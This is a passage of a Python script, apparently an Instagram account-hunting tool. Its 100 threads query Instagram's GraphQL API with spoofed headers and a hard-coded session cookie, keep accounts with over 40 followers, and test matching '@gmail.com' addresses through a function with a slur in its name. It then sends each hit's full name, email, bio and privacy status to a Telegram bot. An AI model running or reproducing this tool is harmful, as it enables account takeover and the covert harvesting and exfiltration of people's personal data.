📸 𝗣𝗼𝘀𝘁𝘀: {p1}
📝 𝗕𝗶𝗼: {b}

🔒 𝗣𝗿𝗶𝘃𝗮𝘁𝗲: {p}
🧾 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {fn}
👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{x}

📨 𝗘𝗺𝗮𝗶𝗹: {y}
🧪 𝗢𝗯𝗳𝘂𝘀 𝗘𝗺𝗮𝗶𝗹: {z}

🔗 𝗨𝗥𝗟: https://www.instagram.com/{x}

👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @aesowns 
╚══════════════════════╝
"""
	params = {
	"chat_id": id,
	"text": msg
	}
	requests.get(f'https://api.telegram.org/bot{tok}/sendMessage', params=params)	
def csrf(s):
    while True:
        try:
            headers = {
                'user-agent': "Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; msm8996; en_US; 545986883)",
                'x-ig-app-id': '936619743392459'
            }
            r = s.get('https://www.instagram.com/', headers=headers, timeout=3)
            token = r.cookies.get_dict().get('csrftoken', '')
            if token:
                with open("csrf.txt", "w") as f:
                    f.write(token)
                break
        except:
            pass
def ccsrf():
    try:
        with open("csrf.txt", "r") as f:
            return f.read().strip()
    except:
        return ""
def users():
    s = requests.Session()
    t = ccsrf()
    while True:
        try:
            fek = random.choice(['cristiano', 'selenagomez', 'nasa', 'natgeo'])
            yes = random.randint(2500000000, 21254029834)
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            cookies = {
                'rur': '"VLL\\05476944984014\\0541788877382:01feb9c5b489b4665ce93731c710cac36c78fdb4c176515a1e9a902103d9b08a5e1aef0f"'
            }
            headers = {
                'User-Agent': "Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; msm8996; en_US; 545986883)",
                'Content-Type': 'application/x-www-form-urlencoded',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-model': '"SM-A235F"',
                'x-ig-app-id': '1217981644879628',
                'sec-ch-ua-mobile': '?1',
                'x-fb-friendly-name': 'QuickPromotionSupportIGSchemaBatchFetchQuery',
                'x-fb-lsd': lsd,
                'sec-ch-ua-platform-version': '"14.0.0"',
                'x-asbd-id': '359341',
                'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
                'sec-ch-prefers-color-scheme': 'light',
                'x-csrftoken': t,
                'sec-ch-ua-platform': '"Android"',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/vihaantheking333/',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({"userID": yes, "username": fek}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            r = s.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data, timeout=10)
            if r.status_code == 200:
                j = r.json()
                ud = j.get('data', {}).get('user', {})
                if not ud:
                    continue
                u = ud.get('username')
                f = ud.get('follower_count', 0)
                if u and f and f > 40:
                    CforChutiya(u+'@gmail.com')
        except:
            pass
s = requests.Session()
csrf(s)
for i in range(100):
    Thread(target=users).start()
    #@aesowns 